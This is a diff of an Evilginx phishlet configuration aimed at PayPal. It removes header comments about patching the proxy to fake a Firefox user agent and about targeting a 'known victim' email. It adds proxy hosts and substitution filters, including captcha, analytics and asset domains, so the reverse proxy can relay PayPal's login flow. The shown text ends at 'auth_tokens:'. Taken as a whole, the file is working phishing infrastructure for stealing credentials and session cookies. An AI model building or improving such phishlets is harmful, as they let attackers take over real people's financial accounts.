@@ -1,28 +1,3 @@
-# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
-# PLEASE DO NOT MISUSE THIS PHISHLET.
-
-# -> To make this phishlet work in chrome browser, We need to modify the proxy code.
-# -> Add below code lines in http_proxy.go file in /core directory of evilginx repo.
-# -> In http_proxy.go file on line 271 , Just above comment " //fix referer".
-#
-
-#				// Replace Any User Agent With Firefox UserAgent ( To fix Paypal phishlet issues in chromium Browser )
-#				useragent := req.Header.Get("User-Agent")
-#				if useragent != "" {
-#							req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0")
-#							log.Debug("[%d] Injected User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 ", ps.Index)
-#				}
-#
-
-
-#________________________________________________________________________________________________________________________________________________________________
-
-# Email Params can be Triggered By using Below Command.
-# lures edit params ID email=test@email.com
-# Where ID is lure id number, and test@email.com is your known victim account email address for paypal. 
-#________________________________________________________________________________________________________________________________________________________________
-
-
 author: '@An0nud4y'
 min_ver: '2.3.0'
 proxy_hosts:
@@ -31,10 +6,18 @@ proxy_hosts:
   - {phish_sub: 'c', orig_sub: 'c', domain: 'paypal.com', session: false, is_landing: false}
   - {phish_sub: 'b.stats', orig_sub: 'b.stats', domain: 'paypal.com', session: false, is_landing: false}
   - {phish_sub: 't', orig_sub: 't', domain: 'paypal.com', session: false, is_landing: false}
+  - {phish_sub: 'i', orig_sub: 'i', domain: 'paypal.com', session: false, is_landing: false}
   - {phish_sub: 'c6', orig_sub: 'c6', domain: 'paypal.com', session: false, is_landing: false}
   - {phish_sub: 'hnd.stats', orig_sub: 'hnd.stats', domain: 'paypal.com', session: false, is_landing: false}
   - {phish_sub: 'm', orig_sub: '', domain: '192.55.233.1', session: false, is_landing: false}
   - {phish_sub: 'ssl', orig_sub: 'slc.stats', domain: 'paypal.com', session: false, is_landing: false}
+  - { phish_sub: 're', orig_sub: 'www', domain: 'recaptcha.net', session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: 'gs', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: '', orig_sub: '', domain: 'browser-intake-us5-datadoghq.com', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'ddbm2', orig_sub: 'ddbm2', domain: 'paypal.com', session: false, is_landing: false}
+  - {phish_sub: 'b.stats', orig_sub: 'b.stats', domain: 'paypal.com', session: false, is_landing: false}
+  - { phish_sub: '', orig_sub: '', domain: 'paypalobjects.com', session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: 'hcaptcha', orig_sub: 'hcaptcha', domain: 'paypal.com', session: true, is_landing: false, auto_filter: true }
 
 sub_filters:
   - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
@@ -42,19 +25,37 @@ sub_filters:
   - {triggers_on: 'www.paypal.com', orig_sub: '', domain: '192.55.233.1', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: 'c6', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: 'c6', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'b.stats.paypal.com', orig_sub: 'b.stats', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'b.stats.paypal.com', orig_sub: 'b.stats', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'hcaptcha.paypal.com', orig_sub: 'hcaptcha', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'hcaptcha.paypal.com', orig_sub: 'hcaptcha', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: 'c', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: 'c', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ddbm2.paypal.com', orig_sub: 'ddbm2', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ddbm2.paypal.com', orig_sub: 'ddbm2', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: 'hnd.stats', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: 'hnd.stats', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: 'slc.stats', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: 'slc.stats', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: 't', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: 't', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'i', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'i', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: '', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: '', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: '', domain: 'paypal.com', search: 'Chrome/', replace: 'Firefox/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: '', domain: 'paypal.com', search: 'Safari/', replace: 'Firefox/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: '', domain: 'paypal.com', search: 'AppleWebKit/', replace: 'Gecko/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.recaptcha.net', orig_sub: 'www', domain: 'recaptcha.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.recaptcha.net', orig_sub: 'www', domain: 'recaptcha.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'browser-intake-us5-datadoghq.com', orig_sub: '', domain: 'browser-intake-us5-datadoghq.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'browser-intake-us5-datadoghq.com', orig_sub: '', domain: 'browser-intake-us5-datadoghq.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'paypalobjects.com', orig_sub: '', domain: 'paypalobjects.com', search: 'https://{hostname}/ae/(.*?\.js)', replace: 'https://{hostname}/ae/${1}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'paypalobjects.com', orig_sub: '', domain: 'paypalobjects.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'hcaptcha.paypal.com', orig_sub: 'hcaptcha', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'hcaptcha.paypal.com', orig_sub: 'hcaptcha', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 
 
 auth_tokens:
